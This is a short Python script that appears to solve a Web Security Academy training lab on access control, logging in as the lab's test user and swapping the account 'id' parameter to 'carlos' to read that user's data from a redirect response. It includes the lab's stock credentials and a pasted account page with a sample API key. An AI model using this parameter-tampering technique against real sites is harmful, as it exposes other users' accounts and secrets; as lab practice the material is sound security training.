# Lab: User ID controlled by request parameter with data leakage in redirect

import requests

base = "https://0a2b005b041ce38780914e660054008b.web-security-academy.net"
s = requests.Session()

#r = s.get(base)
#print(r.text)

print(s.get(f"{base}/login").text)
csrf=input("input csrf: ")
r = s.post(f"{base}/login", data={"username": "wiener", "password": "peter", "csrf": csrf})
print(r.text)
print("========[wiener's account page]============================")
'''
<a href="/my-account?id=wiener">My account</a><p>|</p>

                    <div id=account-content>
                        <p>Your username is: wiener</p>
                        <div>Your API Key is: H6JR66xMD3HZITNqoDV2S5n0RQJH5T2B</div><br/>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="AmdF9MLMrDsyuOfa4ggKe3Ox69iVIgvH">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                    </div>
                </div>
'''
r = s.get(f"{base}/my-account", params={"id": "carlos"}, allow_redirects=False)
#print(r.headers)
print(r.status_code, r.headers.get("Location"))   # 302 /login 이 보여야 정상
print(r.text) 